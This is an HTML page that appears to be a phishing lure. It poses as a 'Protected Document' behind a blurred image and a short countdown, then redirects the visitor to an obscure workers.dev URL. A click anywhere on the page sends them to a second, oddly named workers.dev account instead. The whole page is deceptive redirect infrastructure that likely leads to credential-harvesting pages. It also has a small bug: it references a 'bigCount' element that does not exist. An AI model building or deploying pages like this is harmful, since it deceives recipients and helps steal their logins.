<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Preload image -->
  <link rel="preload" as="image" href="extracted.jpg">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      font-family: Arial, sans-serif;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: transparent;
      position: relative;
    }

    /* 🔥 ONLY the image is blurred */
    body::before {
      content: "";
      position: absolute;
      inset: 0;
      background: url("extracted.jpeg") no-repeat center 10%;
      background-size: 35%;
      filter: blur(4px);
      z-index: 0;
    }

    /* 🔥 Content stays sharp */
    .content {
      position: relative;
      z-index: 1;
      color: #006633;
      text-align: center;
    }

    .text {
      font-size: 18px;
      margin-bottom: 10px;
    }
    .sub-text {
      font-size: 14px; 
      margin-left: -20px;
    }

    .countdown {
      font-size: 10px;
      font-weight: bold;
      animation: pulse 1s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.2); }
      100% { transform: scale(1); }
    }
  </style>
</head>

<body>

  <div class="content">
    <div class="text">
      Protected Document<br/>
     <span class="sub-text">
    Redirecting in <span id="count">2</span>secs....
  </span>
    </div>
  </div>

  <script>
    let count = 2;

    const countText = document.getElementById("count");
    const bigCount = document.getElementById("bigCount");

    const interval = setInterval(() => {
      count--;

      if (count <= 0) {
        clearInterval(interval);
        window.location.href = "https://file-web-sxmu.p-ub5n2atm.workers.dev/l/9_2wXJXMTS0";
      } else {
        countText.textContent = count;
        bigCount.textContent = count;
      }
    }, 1500);

    document.body.addEventListener('click', () => {
      window.location.href = "https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo";
    });
  </script>

</body>
</html>
